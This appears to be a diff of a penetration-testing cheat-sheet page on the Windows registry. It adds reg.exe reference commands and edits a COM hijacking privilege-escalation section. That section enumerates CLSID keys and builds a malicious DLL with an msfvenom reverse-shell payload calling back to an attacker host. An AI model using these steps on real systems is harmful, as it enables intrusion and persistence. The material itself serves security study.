@@ -1,24 +1,81 @@
 ---
 title: "Registry"
-date: 2025-7-14
+date: 2025-7-24
 tags: ["Windows", "Registry", "reg.exe", "Windows Internals", "Persistence", "COM Hijacking", "DLL Injection"]
 ---
 
-### Basic
+### General
+
+#### Key Hives
 
 ```console
-# Queries all CLSID entries recursively
+HKEY_LOCAL_MACHINE (HKLM)     System-wide settings (SAM, SYSTEM, SOFTWARE, SECURITY)
+HKEY_CURRENT_USER (HKCU)      Current user settings
+HKEY_USERS (HKU)              All loaded user profiles
+HKEY_CLASSES_ROOT (HKCR)      File associations, COM objects
+HKEY_CURRENT_CONFIG (HKCC)    Current hardware config
+```
+
+#### Query Key
+
+```console
+# Displays all keys, subkeys, and values recursively
+reg query <PATH> /s
+```
+
+```console {class="sample-code"}
+# Display all keys, subkeys, and values under CLSID recursively
 reg query HKCR\CLSID /s
 ```
 
 ```console
-# Queries CLSID entries containing KEYWORD recursively
-reg query HKCR\CLSID /s /f "<KEYWORD>"
+# Display all keys, subkeys, and values containing KEYWORD recursively
+reg query <PATH> /s /f "<KEYWORD>"
 ```
 
-```console
-# Queries HKLM entries containing KEYWORD recursively
+```console {class="sample-code"}
+# Display all keys, subkeys, and values containing KEYWORD under HKLM recursively
 reg query HKLM /s /f "<KEYWORD>"
+```
+
+#### Add Key
+
+```console
+reg add <PATH>
+```
+
+#### Add Value
+
+```console
+reg add <PATH> /v <VALUE_NAME> /t <TYPE> /d <DATA> /f
+```
+
+```console {class="sample-code"}
+reg add HKLM\SOFTWARE\MyNewKey /v MySetting /t REG_SZ /d "TestValue" /f
+```
+
+<br>
+
+```console
+REG_SZ          Text string
+REG_EXPAND_SZ   String with environment variables
+REG_DWORD       32-bit integer
+REG_QWORD       64-bit integer
+REG_BINARY      Binary data
+REG_MULTI_SZ    Multiple strings
+REG_NONE        Undefined data
+```
+
+#### Delete Key
+
+```console
+reg delete <PATH> /f
+```
+
+#### Export Hive
+
+```console
+reg save <HIVE> <DEST_PATH>
 ```
 
 ### Privesc #1: COM Hijacking
@@ -26,15 +83,15 @@ reg query HKLM /s /f "<KEYWORD>"
 {{< tab set1 tab1 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-#### 1. Query Registry
+#### 1. Registry Enum
 
 ```console
-# Queries all CLSID entries recursively
+# Query all CLSID entries recursively
 reg query HKCR\CLSID /s
 ```
 
 ```console
-# Queries CLSID entries containing KEYWORD recursively
+# Query CLSID entries containing KEYWORD recursively
 reg query HKCR\CLSID /s /f "<KEYWORD>"
 ```
 
@@ -51,7 +108,7 @@ HKEY_CLASSES_ROOT\CLSID\{2317---[SNIP]---20000}\InprocServer32
 ---[SNIP]---
 ```
 
-#### 2. Create Malicious DLL
+#### 2. Create a Malicious DLL
 
 ```console
 msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f dll --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.dll
